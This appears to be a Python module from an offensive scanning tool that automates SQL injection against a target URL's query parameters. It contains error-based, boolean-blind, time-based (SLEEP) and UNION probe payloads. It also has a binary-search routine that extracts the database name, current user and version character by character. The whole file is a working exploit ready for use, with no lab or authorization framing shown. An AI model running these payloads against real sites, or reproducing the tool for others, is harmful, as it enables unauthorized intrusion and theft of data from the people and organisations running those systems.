"""sqli v6 — sniper: targeted payloads + binary search extraction"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.sniper import SniperProbe
import time


ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "pg_query", "sqlstate", "unclosed quotation",
    "you have an error in your sql", "warning: mysql", "ora-",
    "quoted string not properly terminated", "syntax error at or near",
]


class Sqli:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}

        sniper = SniperProbe(session, logger)
        base = sniper.take_baseline(target, samples=3)
        if not base:
            print("[sqli] no baseline"); return {}

        print(f"[sqli] sniper mode")
        print(f"[sqli] baseline: {base['code']} {base['len']}b "
              f"avg={base['avg_time']:.2f}s stable={base['stable_len']}")
        print(f"[sqli] params: {list(params.keys())}")
        print()

        findings = []
        vuln_param = None

        for name in params:
            original = params[name][0]
            print(f"[param: {name}]")

            # 5 targeted payloads (не 667)
            probes = [
                # 1. error-based single quote
                (f"{original}'", "error", ERROR_MARKERS),
                # 2. error-based double quote
                (f'{original}"', "error", ERROR_MARKERS),
                # 3. boolean true vs false
                (f"{original}' AND '1'='1", "boolean_true", None),
                (f"{original}' AND '1'='2", "boolean_false", None),
                # 4. time-based
                (f"{original}' AND SLEEP(3)-- -", "time", None),
                # 5. union (1 column probe)
                (f"{original}' UNION SELECT NULL-- -", "union", None),
            ]

            # === error-based ===
            for payload, kind, markers in probes[:2]:
                url_fn = lambda p, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()},
                                                 name: p}, doseq=True)))
                r = sniper.probe(url_fn, payload, detect_markers=markers, label="err")
                if r.get("hit") and r["confidence"] >= 60:
                    print(f"  ✓ error: {payload[:30]}")
                    print(f"    confidence: {r['confidence']}%")
                    print(f"    evidence: {r['evidence'][:80]}")
                    findings.append({
                        "param": name, "payload": payload,
                        "type": "error", "confidence": r["confidence"],
                        "evidence": r["evidence"],
                    })
                    logger.finding("sqli_error", "high",
                                   f"{name}={payload[:40]} conf={r['confidence']}%")
                    vuln_param = name
                    break

            # === boolean blind (true vs false) ===
            if not vuln_param:
                url_fn = lambda p, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()},
                                                 name: p}, doseq=True)))
                r_t = sniper.http.get(url_fn(probes[2][0]))
                time.sleep(0.2)
                r_f = sniper.http.get(url_fn(probes[3][0]))
                if r_t and r_f:
                    diff = abs(len(r_t.content) - len(r_f.content))
                    if diff > 100:
                        print(f"  ✓ boolean blind: true/false diff={diff}b")
                        findings.append({
                            "param": name, "type": "boolean_blind",
                            "confidence": 65, "diff": diff,
                        })
                        logger.finding("sqli_boolean", "high", f"{name} diff={diff}")
                        vuln_param = name

            # === time-based ===
            if not vuln_param:
                url_fn = lambda p, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()},
                                                 name: p}, doseq=True)))
                t0 = time.time()
                r = sniper.http.get(url_fn(probes[4][0]))
                dt = time.time() - t0
                if dt > base["avg_time"] + 2.5:
                    print(f"  ✓ time-based: {dt:.2f}s")
                    findings.append({
                        "param": name, "payload": probes[4][0],
                        "type": "time", "confidence": 65, "delay": round(dt, 2),
                    })
                    logger.finding("sqli_time", "high", f"{name} delay={dt:.2f}s")
                    vuln_param = name

        # === extraction if blind ===
        if vuln_param and any(f["type"] in ("boolean_blind", "time") for f in findings):
            print()
            print(f"[sqli] blind injection — binary search extraction")
            self._extract_blind(sniper, u, params, vuln_param, logger)

        print()
        print(f"[sqli] findings: {len(findings)}")
        print(f"[sqli] stats: {sniper.summary()}")
        return {"findings": findings, "stats": sniper.summary()}

    def _extract_blind(self, sniper, u, params, param, logger):
        """Extract via boolean binary search — 8 requests per char."""
        queries = [
            ("database", "database()"),
            ("user", "current_user()"),
            ("version", "version()"),
        ]
        for qname, expr in queries:
            print(f"  [{qname}] extracting...")
            result = ""
            for pos in range(1, 33):
                c = self._binary_char(sniper, u, params, param, expr, pos)
                if not c or c == 0:
                    break
                result += chr(c)
                print(f"    pos {pos}: '{chr(c)}' → '{result}'", flush=True)
            if result.strip():
                logger.finding("sqli_extract", "critical", f"{qname}={result.strip()}")

    def _binary_char(self, sniper, u, params, param, query, pos):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            p = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- -"
            url = urlunparse(u._replace(query=urlencode(
                {**{k: v[0] for k, v in params.items()}, param: p}, doseq=True)))
            r = sniper.http.get(url)
            if not r:
                return 0
            # boolean: > mid means bigger than mid → true (same len as baseline)
            if abs(len(r.content) - sniper.baseline["len"]) < 100:
                lo = mid + 1
            else:
                hi = mid - 1
        return lo if 32 < lo < 127 else 0
